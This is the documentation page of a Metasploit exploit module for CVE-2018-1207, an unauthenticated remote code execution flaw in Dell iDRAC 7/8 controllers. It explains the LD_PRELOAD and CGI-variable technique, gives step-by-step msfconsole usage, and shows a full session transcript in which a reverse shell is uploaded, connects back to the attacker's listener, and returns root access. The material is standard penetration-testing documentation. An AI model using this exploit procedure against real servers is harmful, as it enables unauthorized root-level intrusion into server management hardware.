## Description  

Dell IDRAC servers prior to firmware version 2.52.52.52 are vulnerable to an unauthenticated remote code execution vulnerability, CVE-2018-1207. This exploit makes use of CGI environment variables to upload a reverse shell and hook LD_PRELOAD to obtain a connection. This process has the potential to fork bomb the system, so this module safely unsets the LD_PRELOAD variable on connection to the reverse shell. The servers run on the SH4 architecture, which requires cross-compiling with the gcc-8-sh4-linux-gnu package. Only a reverse shell is supported at this time.

## Vulnerable Application  

Dell IDRAC 7/8


## Vulnerable Application Installation Setup.

Generation 12 and 13 Dell PowerEdge servers are vulnerable. 

https://en.wikipedia.org/wiki/List_of_Dell_PowerEdge_Servers

## Verification Steps  

  1. Identify an IDRAC 7 or 8 appliance
  2. Start msfconsole
  3. Do: ```use exploit/linux/http/dell_idrac_upload_exec```
  4. Do: ``set rhosts <ip>``
  5. Do: ``set rport <80/443>``

``[*] 192.168.0.10 The target is vulnerable.``

  6. Do: ``set lhost <ip>``
  7. Do: ``set lport <port>``
  8. Do: ``exploit``
  9. You should get a shell.

## Scenarios  

TESTED AGAINST LINUX

```
msf5 > use exploit/linux/http/dell_idrac_upload_exec
msf5 exploit(linux/http/dell_idrac_upload_exec) > options 

Module options (exploit/linux/http/dell_idrac_upload_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   TIMEOUT  15               no        Override default timeout for reqeusts
   VHOST                     no        HTTP server virtual host


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf5 exploit(linux/http/dell_idrac_upload_exec) > set rhosts 192.168.0.10
rhost => 192.168.0.10
msf5 exploit(linux/http/dell_idrac_upload_exec) > check
[*] Sending request to http://192.168.0.10/cgi-bin/login?LD_DEBUG=files
[*] Valid response received...
[+] 192.168.0.10:80 The target is vulnerable.
msf5 exploit(linux/http/dell_idrac_upload_exec) > set lhost 192.168.0.5
lhost => 192.168.0.5
msf5 exploit(linux/http/dell_idrac_upload_exec) > exploit 
[*] Started reverse TCP handler on 192.168.0.5:4444
[*] Sending request to http://192.168.0.10/cgi-bin/login?LD_DEBUG=files
[*] Valid response received...
[*] Sending request for http://192.168.0.10/cgi-bin/putfile
[*] 192.168.0.10 - Exploit Upload Success
[*] Command shell session 1 opened (192.168.0.5:4444 -> 192.168.0.10:45038) at 2020-02-26 12:51:27 -0600

id
uid=0(root) gid=0(root)
```
